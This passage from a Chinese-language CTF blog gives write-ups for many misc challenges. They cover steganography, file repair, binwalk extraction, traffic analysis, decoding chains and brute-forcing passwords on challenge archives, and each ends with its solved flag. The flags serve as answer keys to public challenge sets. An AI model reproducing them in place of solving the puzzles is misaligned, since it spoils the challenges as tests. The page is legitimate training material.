的字符串</span></span><br></pre></td></tr></table></figure><p>将拼接出来的字符串 base64 解码一次再 base85 解码一次可以得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;have_a_good_day1&#125;</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-Unravel"><a href="#MRCTF2020-Unravel" class="headerlink" title="[MRCTF2020]Unravel!!"></a>[MRCTF2020]Unravel!!</h3><p>在解压出的音频尾部可以找到一串 AES 密文。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1&#x2F;nSQN+hoHL8OwV9iJB&#x2F;mSdKk5dmusulz4&#x3D;</span><br></pre></td></tr></table></figure><p>binwalk 可知 JM.png 中包含多个图片，<code>binwalk -e</code> 分离可以得到一个图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213898413936.2f9dffbe95b477175e52c3ca3342f9ba5b4849ac.png" alt="aes"></p><p>将其作为 AES 的 key 可以解出明文 <code>CCGandGulu</code>。将解出的明文作为压缩包密码解压 win-win.zip 可以得到一个音频文件。SilentEye 可解出 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213898495960.c7439103a74ca59eced947abc7803b7891e377fa.png" alt="image-20210128003903001"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MRCTF&#123;Th1s_is_the_3nd1n9&#125;</span><br></pre></td></tr></table></figure><h3 id="GKCTF2020-code-obfuscation"><a href="#GKCTF2020-code-obfuscation" class="headerlink" title="[GKCTF2020]code obfuscation"></a>[GKCTF2020]code obfuscation</h3><p>将图片修复好，扫描后得到信息 <code>base(gkctf)</code>。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213898564555.2c8040721a3082c7c531e191fe3935bc3091ac78.png"></p><p>binwalk 可知图片中包含一个压缩文件，<code>binwalk -e</code> 分离。根据上一步的信息，尝试后可知压缩包密码为 <code>base58(gkctf)</code>，即 <code>CfjxaPF</code>。</p><h3 id="UTCTF2020-docx"><a href="#UTCTF2020-docx" class="headerlink" title="[UTCTF2020]docx"></a>[UTCTF2020]docx</h3><p>将 docx 文件解压后在 media 文件夹内可找到 flag 图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213898674662.58e06720688738ba5eea0d63608558d1b4ee794f.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utflag&#123;unz1p_3v3ryth1ng&#125;</span><br></pre></td></tr></table></figure><h3 id="GKCTF2020-Harley-Quinn"><a href="#GKCTF2020-Harley-Quinn" class="headerlink" title="[GKCTF2020]Harley Quinn"></a>[GKCTF2020]Harley Quinn</h3><p>附件压缩包的备注里有需要用到的工具提示。下载 FreeFileCamouflage，发现是图片提取软件。图片的属性中有 #password# 字样，听到最后发现有 DTMF，上传到工具识别。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213898795053.a667fca4a820a7c79bd69333a9b317b494473e09.png"></p><p>得到 <code>btdipdun</code>，因为提示说可读短句，稍作修正后可得到 <code>ctfisfun</code>。将其作为密码提取图片中的隐写即可得到 flag 文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Pudd1n!!_y0u_F1nd_m3!&#125;</span><br></pre></td></tr></table></figure><h3 id="派大星的烦恼"><a href="#派大星的烦恼" class="headerlink" title="派大星的烦恼"></a>派大星的烦恼</h3><p>根据题目描述，在图片中找到区块并复制出来得到字符串。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;DD&quot;DD&quot;&quot;&quot;&quot;D&quot;DD&quot;&quot;&quot;&quot;&quot;&quot;DD&quot;&quot;&quot;DD&quot;DD&quot;&quot;D&quot;&quot;DDD&quot;&quot;D&quot;D&quot;DD&quot;&quot;&quot;&quot;&quot;&quot;DD&quot;&quot;D&quot;&quot;&quot;&quot;DD&quot;D&quot;D&quot;DD&quot;&quot;&quot;&quot;D&quot;DD&quot;&quot;D&quot;&quot;&quot;DD&quot;&quot;&quot;&quot;&quot;DDD&quot;&quot;&quot;&quot;D&quot;DD&quot;&quot;&quot;D&quot;&quot;&quot;DD&quot;&quot;&quot;D&quot;&quot;DD&quot;D&quot;D&quot;DD&quot;&quot;&quot;DD&quot;&quot;DD&quot;D&quot;D&quot;&quot;DD&quot;&quot;DD&quot;DD&quot;&quot;&quot;D&quot;&quot;&quot;DD&quot;&quot;DD&quot;DD&quot;&quot;D&quot;D&quot;&quot;DD&quot;D&quot;D&quot;DD&quot;&quot;&quot;D&quot;&quot;&quot;DD&quot;&quot;&quot;D&quot;DD&quot;&quot;DD&quot;&quot;&quot;DD&quot;D&quot;D&quot;&quot;DD&quot;&quot;&quot;D&quot;DD&quot;&quot;DD&quot;&quot;DD&quot;&quot;&quot;&quot;&quot;DDD&quot;&quot;DD&quot;&quot;DD&quot;&quot;&quot;D&quot;&quot;DD&quot;&quot;</span><br></pre></td></tr></table></figure><p>将其转换为二进制字符串，得到了如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0110110000101100000011000110110010011100101011000000110010000110101011000010110010001100000111000010110001000110001001101010110001100110101001100110110001000110011011001010011010101100010001100010110011000110101001100010110011001100000111001100110001001100</span><br></pre></td></tr></table></figure><p>接下来要做的就是想办法把它转换为字符串，经过尝试得出 <code>reverse-&gt;From Binary-&gt;reverse</code> 的路径，得出正确的 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6406950a54184bd5fe6b6e5b4ce43832&#125;</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-Hello-misc"><a href="#MRCTF2020-Hello-misc" class="headerlink" title="[MRCTF2020]Hello_ misc"></a>[MRCTF2020]Hello_ misc</h3><p>010 editor 打开解压出的图片，发现文件尾部有个压缩包，提取出来之后发现压缩包需要密码。将图用 StegSolve 可解得另一张图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899036243.7a82ceb07c58b786710133a32546e8b1990c61c5.png"></p><p>将其保存下来，打开查看发现压缩包密码信息。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899206462.eca123fb996f3692ea378d6e5493c072f147013e.png"></p><p>将压缩包解压之后得到了很多数字，看形式像 TTL 信息隐写。用脚本跑出信息 <code>rar-passwd:0ac1fe6b77be5dbe</code>。依此解开 rar 压缩文档之后得到一个 Word 文档。修正其拓展名后打开，得到一串 base64。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MTEwMTEwMTExMTExMTEwMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTEwMDAwMDAxMTExMTExMTExMDAxMTAx</span><br><span class="line">MTEwMTEwMTEwMDAxMTAxMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTExMTExMTExMTExMTEwMTEwMDEx</span><br><span class="line">MTEwMDAwMTAxMTEwMTExMDExMTEwMTExMTExMTAwMDExMTExMTExMTExMDAxMDAxMTAxMTEwMDAwMDExMTExMDAwMDExMTExMTEx</span><br><span class="line">MTEwMTEwMTAwMDAxMTExMDExMTEwMTExMTExMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTExMTExMTAwMTEwMTExMTExMTExMTEx</span><br><span class="line">MTEwMTEwMTAxMTExMTExMDExMTEwMTExMTAxMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTAxMTExMTAwMTEwMTExMTExMTExMTEx</span><br><span class="line">MTEwMTEwMTAwMDAxMTAwMDAwMTEwMDAwMDAxMTAwMDExMTAwMDAwMTEwMTEwMTEwMTAxMTEwMDAwMDAxMTExMDAwMDExMTExMTEx</span><br></pre></td></tr></table></figure><p>对其逐行解密后得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">110110111111110011110111111111111111111111111111101110000001111111111001101</span><br><span class="line">110110110001101011110111111111111111111111111111111101111111111111110110011</span><br><span class="line">110000101110111011110111111100011111111111001001101110000011111000011111111</span><br><span class="line">110110100001111011110111111011101111111110110110101111111100110111111111111</span><br><span class="line">110110101111111011110111101011101111111110110110101101111100110111111111111</span><br><span class="line">110110100001100000110000001100011100000110110110101110000001111000011111111</span><br></pre></td></tr></table></figure><p>替换字符可以更直观得看到 flag。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0  0        00    0                            0   000000          00  0 </span><br><span class="line">0  0  000  0 0    0                               0               0  00  </span><br><span class="line">0000 0   0   0    0       000           00 00  0   00000     0000        </span><br><span class="line">0  0 0000    0    0      0   0         0  0  0 0        00  0            </span><br><span class="line">0  0 0       0    0    0 0   0         0  0  0 0  0     00  0            </span><br><span class="line">0  0 0000  00000  000000  000   00000  0  0  0 0   000000    0000        </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;He1Lo_mi5c~&#125;</span><br></pre></td></tr></table></figure><h3 id="BSidesSF2019-zippy"><a href="#BSidesSF2019-zippy" class="headerlink" title="[BSidesSF2019]zippy"></a>[BSidesSF2019]zippy</h3><p>Wireshark 分析流量包，追踪 TCP 流量，可以直接看到压缩文档和压缩文档的密码，提取出来解压文档即可得到 flag 文件。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899283584.ec40c6833f6a17f0f18176221eb61637a7853e49.png"></p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899347029.97d951be27918489a4d40a216f31072b43177579.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;this_flag_is_your_flag&#125;</span><br></pre></td></tr></table></figure><h3 id="粽子的来历"><a href="#粽子的来历" class="headerlink" title="粽子的来历"></a>粽子的来历</h3><p>将解压所得的 Word 文档文件修复，打开可得诗句。根据不同的行距将其转化为二进制标记得到如下数据。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">10010100010</span><br><span class="line">101010010011</span><br><span class="line">100100100001</span><br><span class="line">111100100001</span><br></pre></td></tr></table></figure><p>分别将其用 MD5 摘要之后得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">447b98f8c092f12a4773ca9809ef6b5f</span><br><span class="line">59f3bfe7c1e00ba34e4558cf295544bc</span><br><span class="line">d473ee3def34bd022f8e5233036b3345</span><br><span class="line">d579f5f8d6c01ec08971fbc0c68f1ddd</span><br></pre></td></tr></table></figure><p>其中第三个为 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d473ee3def34bd022f8e5233036b3345&#125;</span><br></pre></td></tr></table></figure><h3 id="UTCTF2020-file-header"><a href="#UTCTF2020-file-header" class="headerlink" title="[UTCTF2020]file header"></a>[UTCTF2020]file header</h3><p>修复附件的 PNG 文件头 <code>89 50 4E 47</code>，查看图片可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utflag&#123;3lit3_h4ck3r&#125;</span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-spaceclub"><a href="#WUSTCTF2020-spaceclub" class="headerlink" title="[WUSTCTF2020]spaceclub"></a>[WUSTCTF2020]spaceclub</h3><p>打开文件后全选可见长短错落的空格。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899420208.01bed04a4b41c7f3aa9fd01a1d349f545fd58b87.png"></p><p>将短行转换为 0，长行转换为 1，得到如下字符。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">011101110110001101110100011001100011001000110000001100100011000001111011011010000011001101110010011001010101111100110001011100110101111101111001001100000111010101110010010111110110011001101100010000000110011101011111011100110011000101111000010111110111001100110001011110000101111101110011001100010111100001111101</span><br></pre></td></tr></table></figure><p>将其转换为十六进制可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf2020&#123;h3re_1s_y0ur_fl@g_s1x_s1x_s1x&#125;</span><br></pre></td></tr></table></figure><h3 id="ACTF新生赛2020-music"><a href="#ACTF新生赛2020-music" class="headerlink" title="[ACTF新生赛2020]music"></a>[ACTF新生赛2020]music</h3><p>010 editor 打开文件看到文件头为 <code>A1 A1 A1</code> 但是 m4a 的文件头应该为 <code>00 00 00</code>，于是猜测其对文件进行了异或运算。将文件导入 CyberChef 中进行异或得到原文件。打开文件即可听出 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actf&#123;abcdfghijk&#125;</span><br></pre></td></tr></table></figure><h3 id="UTCTF2020-basic-forensics"><a href="#UTCTF2020-basic-forensics" class="headerlink" title="[UTCTF2020]basic-forensics"></a>[UTCTF2020]basic-forensics</h3><p>修正文件拓展名，搜索 flag 即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utflag&#123;fil3_ext3nsi0ns_4r3nt_r34l&#125;</span><br></pre></td></tr></table></figure><h3 id="SCTF2019-电单车"><a href="#SCTF2019-电单车" class="headerlink" title="[SCTF2019]电单车"></a>[SCTF2019]电单车</h3><p>这题是真的少信息了，原本应该有个题目描述的。要找的是信号的地址位的 20bit。使用 Audition 转写即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;01110100101010100110&#125;</span><br></pre></td></tr></table></figure><h3 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h3><p>010 editor 打开文件后补全拓展名。使用 AOPR 进行密码爆破得到密码为 9919。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899548540.ce9e7025d04d870e1ece5ac77e2d113da6a2656c.png" alt="image-20210128143859208"></p><p>尝试后修正拓展名为 ppt，使用 PowerPoint 打开文件后在倒数第二页可找到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag&#123;okYOUWIN&#125;</span><br></pre></td></tr></table></figure><h3 id="真的很杂"><a href="#真的很杂" class="headerlink" title="真的很杂"></a>真的很杂</h3><p><code>binwalk -e</code> 分离出一个 apk 文件，使用 apktool 反编译文件。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899639491.af8b9bac515d9fc4e8bc144d0d2b29211bac2205.png"></p><p>查看 MainActivity.smali 可以看到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.line 32</span><br><span class="line">    .local v6, &quot;text&quot;:Landroid&#x2F;widget&#x2F;TextView;</span><br><span class="line">    const-string v0, &quot;flag&#123;25f991b27f&quot;</span><br><span class="line"></span><br><span class="line">    .line 33</span><br><span class="line">    .local v0, &quot;True1&quot;:Ljava&#x2F;lang&#x2F;String;</span><br><span class="line">    const-string v1, &quot;c&quot;</span><br><span class="line"></span><br><span class="line">    .line 34</span><br><span class="line">    .local v1, &quot;True2&quot;:Ljava&#x2F;lang&#x2F;String;</span><br><span class="line">    const-string v2, &quot;dc2f7a82a2b34&quot;</span><br><span class="line"></span><br><span class="line">    .line 35</span><br><span class="line">    .local v2, &quot;True3&quot;:Ljava&#x2F;lang&#x2F;String;</span><br><span class="line">    const-string v3, &quot;3&quot;</span><br><span class="line"></span><br><span class="line">    .line 36</span><br><span class="line">    .local v3, &quot;True4&quot;:Ljava&#x2F;lang&#x2F;String;</span><br><span class="line">    const-string v4, &quot;86e81c4&#125;&quot;</span><br></pre></td></tr></table></figure><p>拼接起来即得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;25f991b27fcdc2f7a82a2b34386e81c4&#125;</span><br></pre></td></tr></table></figure><h3 id="湖南省赛2019-Findme"><a href="#湖南省赛2019-Findme" class="headerlink" title="[湖南省赛2019]Findme"></a>[湖南省赛2019]Findme</h3><p>解压得到五个图片，分别从五个图片中得到 flag 的一部分。</p><p>在第二幅图的文件尾部有一个压缩文档，文件头以 7z 开头，可是之后却是 <code>03 04</code> 于是猜测其实是个 zip 文档。将 7z 都替换为 PK 以修正文档。修正之后解压文档得到一堆文本文档，推测有用的信息大小不一样，于是将其按大小排序，找到 618.txt。其中包含信息如下。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You find it: 1RVcmVfc</span><br></pre></td></tr></table></figure><p>第五幅图的尾部有如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I give U a gift:Yzcllfc0lN</span><br></pre></td></tr></table></figure><p>第四幅图的尾部有如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">another part:cExlX1BsY</span><br></pre></td></tr></table></figure><p>第三幅图用 010 editor 打开的时候运行模板会因为 CRC 不匹配报错，而这些 CRC 值都只有最后两位，将其提取出来转 ASCII 的带如下信息。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899682208.d6d9792d9fc144d063d5f3bfd79440649b16a843.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">33 52 6C 5A 33 30 3D --&gt; 3RlZ30&#x3D;</span><br></pre></td></tr></table></figure><p>第一幅图打开时发现了 IDAT 缺失的情况，将其补齐修正。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899724368.f273c690041bd928108abb9eccc3b6c8884ce614.png"></p><p>再使用脚本爆破图片宽高，得到 <code>(&#39;hex:&#39;, &#39;0xe3&#39;, &#39;0x1c5&#39;)</code>。将图片宽高修正。再使用 StegSolve 可解出一个二维码。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899760806.26d250eaac385d20f381028ee6c8b3961af1d528.png"></p><p>修正定位码之后扫描可得如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3s0X3</span><br></pre></td></tr></table></figure><p>将内容片段拼接，base64 解码即可得到 flag。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3s0X3Yzcllfc0lNcExlX1BsY1RVcmVfc3RlZ30&#x3D;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4_v3rY_sIMpLe_PlcTUre_steg&#125;</span><br></pre></td></tr></table></figure><h3 id="voip"><a href="#voip" class="headerlink" title="voip"></a>voip</h3><p>Wireshark 使用 RTP 分析 VoiP 流量包，直接可以听到电话的音频，不过有些难听懂。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899805741.891443feb7f346025e3f85db5927a698e2431076.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seccon&#123;9001IVR&#125;</span><br></pre></td></tr></table></figure><h3 id="UTCTF2020-zero"><a href="#UTCTF2020-zero" class="headerlink" title="[UTCTF2020]zero"></a>[UTCTF2020]zero</h3><p>打开之后是一段示例文字，但是文件的编码有点不一样。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899847498.61fd0a647b949fd34970235a843408926622496c.png"></p><p>根据题目暗示，找到<a href="https://330k.github.io/misc_tools/unicode_steganography.html">零宽字符隐写</a>，解得 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899886251.2f91d96e5c9f0d03e5837a6b37e581b6f10270d5.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utflag&#123;whyNOT@sc11_4927aajbqk14&#125;</span><br></pre></td></tr></table></figure><h3 id="QCTF2018-X-man-A-face"><a href="#QCTF2018-X-man-A-face" class="headerlink" title="[QCTF2018]X-man-A face"></a>[QCTF2018]X-man-A face</h3><p>解压得到一张图片，上面有一个残缺的二维码，将其定位码修正。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899920810.eb10fee621a9b93eaa31e537160b3f9308586e15.jpg"></p><p>扫描二维码之后得到一串字符串，将其 base32 解码即可得到 flag。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KFBVIRT3KBZGK5DUPFPVG2LTORSXEX2XNBXV6QTVPFZV6TLFL5GG6YTTORSXE7I&#x3D;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QCTF&#123;Pretty_Sister_Who_Buys_Me_Lobster&#125;</span><br></pre></td></tr></table></figure><h3 id="Business-Planning-Group"><a href="#Business-Planning-Group" class="headerlink" title="Business Planning Group"></a>Business Planning Group</h3><p>使用 010 editor 打开图片可以发现文件尾存在 bpg 图像，将其分离出来。使用<a href="https://webencoder.libbpg.org/show.html">在线的工具</a>可以将其显示并下载为 png 文件。<img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899991881.ccbd0f85ffe704be906af6da08d28b502d744354.png"></p><p>将图片上的文本提取出来并 base64 解码即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bsides_delhi&#123;BPG_i5_b3tt3r_7h4n_JPG&#125;</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-pyFlag"><a href="#MRCTF2020-pyFlag" class="headerlink" title="[MRCTF2020]pyFlag"></a>[MRCTF2020]pyFlag</h3><p>压缩包解压后为三张图片，使用 010 editor 打开图片发现每张图片的最后都有一部分信息，将其拼起来之后得到一个压缩文档。使用 ARCHPR 爆破出压缩包密码为 1234。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900030964.0746c4b74fee0a25ffbb6c72fd8830ca2f05aa6b.png"></p><p>解压文件后得到加密的 flag。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">G&amp;eOhGcq(ZG(t2*H8M3dG&amp;wXiGcq(ZG&amp;wXyG(j~tG&amp;eOdGcq+aG(t5oG(j~qG&amp;eIeGcq+aG)6Q&lt;G(j~rG&amp;eOdH9&lt;5qG&amp;eLvG(j~sG&amp;nRdH9&lt;8rG%++qG%__eG&amp;eIeGc+|cG(t5oG(j~sG&amp;eOlH9&lt;8rH8C_qH9&lt;8oG&amp;eOhGc+_bG&amp;eLvH9&lt;8sG&amp;eLgGcz?cG&amp;3|sH8M3cG&amp;eOtG%_?aG(t5oG(j~tG&amp;wXxGcq+aH8V6sH9&lt;8rG&amp;eOhH9&lt;5qG(&lt;E-H8M3eG&amp;wXiGcq(ZG)6Q&lt;G(j~tG&amp;eOtG%+&lt;aG&amp;wagG%__cG&amp;eIeGcq+aG&amp;M9uH8V6cG&amp;eOlH9&lt;8rG(&lt;HrG(j~qG&amp;eLcH9&lt;8sG&amp;wUwGek2)</span><br></pre></td></tr></table></figure><p>将其经过 <code>base85--&gt;From Hex--&gt;base32--&gt;From Hex--&gt;base64</code> 的解码之后即可得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900077524.753bf8affa3e66e421907d64490e7b3c60222354.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MRCTF&#123;Y0u_Are_4_p3rFect_dec0der&#125;</span><br></pre></td></tr></table></figure><h3 id="ACTF新生赛2020-剑龙"><a href="#ACTF新生赛2020-剑龙" class="headerlink" title="[ACTF新生赛2020]剑龙"></a>[ACTF新生赛2020]剑龙</h3><p>解压得到很多文件，pwd 里有一段 aaencode 的 js 代码，解码后得到 <code>welcom3!</code>。将其作为密钥用 Steghide 从图片中解出一段 DES 密文。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1&#x2F;7KeHVl5984OsGUVSanPfPednHpK9lKvp0kdrxO4Tj&#x2F;Q&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>结合图片备注中的密钥 <code>@#$%^&amp;%%$)</code> 可以解出如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">think about stegosaurus</span><br></pre></td></tr></table></figure><p>使用 Stegosaurus 工具对 O_O 文件提取数据就能得到 flag。可能是文件有问题，这部分没有复现到。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3teg0Sauru3_!1&#125;</span><br></pre></td></tr></table></figure><h3 id="GUET-CTF2019-soul-sipse"><a href="#GUET-CTF2019-soul-sipse" class="headerlink" title="[GUET-CTF2019]soul sipse"></a>[GUET-CTF2019]soul sipse</h3><p>对音频 Steghide 解隐写解出一个文本，微云下载后的得到一张图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900116191.9fe8705b375c4a9434db508eed97f32d81529d80.png"></p><p>修复图片的文件头，并将图片上的内容转为文本，得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u0034\u0030\u0037\u0030\u000d\u000a\u0031\u0032\u0033\u0034\u000d\u000a</span><br></pre></td></tr></table></figure><p>Unescape Unicode Characters 解码得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4070</span><br><span class="line">1234</span><br></pre></td></tr></table></figure><p>将这两行相加得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5304&#125;</span><br></pre></td></tr></table></figure><h3 id="UTCTF2020-spectogram"><a href="#UTCTF2020-spectogram" class="headerlink" title="[UTCTF2020]spectogram"></a>[UTCTF2020]spectogram</h3><p>音频文件使用 Audition 打开，在频谱部分可以看到 flag。</p><p><img 